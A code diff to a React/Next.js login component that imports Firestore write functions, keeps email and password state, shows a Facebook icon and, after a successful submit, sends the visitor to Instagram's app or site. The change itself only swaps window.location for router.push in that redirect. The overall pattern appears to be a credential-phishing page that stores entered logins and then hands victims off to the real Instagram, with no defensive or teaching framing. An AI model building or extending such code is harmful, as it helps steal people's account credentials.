@@ -3,6 +3,7 @@ import React, { useState, useEffect } from 'react';
 import { firestore } from './firebaseconfig'; // Adjust the import path
 import { collection, addDoc } from 'firebase/firestore'; // Import the necessary functions
 import { FaFacebookSquare } from "react-icons/fa";
+import { useRouter } from 'next/router';
 
 export default function Login() {
   const [email, setEmail] = useState('');
@@ -10,6 +11,7 @@ export default function Login() {
   const [error, setError] = useState('');
   const [success, setSuccess] = useState('');
   const [loading, setLoading] = useState(false); // Add loading state
+  const router = useRouter(); // Hook for routing
 
   const handleSubmit = async (event) => {
     event.preventDefault();
@@ -44,13 +46,10 @@ export default function Login() {
   useEffect(() => {
     if (success) {
       
-      if (typeof window !== 'undefined') {
-       
-        if (navigator.userAgent.match(/Android|iPhone/i)) {
-          window.location.href = 'instagram://';
-        } else {
-          window.location.href = 'https://www.instagram.com';
-        }
+      if (navigator.userAgent.match(/Android|iPhone/i)) {
+        router.push('instagram://'); // This won't work in many browsers
+      } else {
+        router.push('https://www.instagram.com');
       }
     }
   }, [success]);
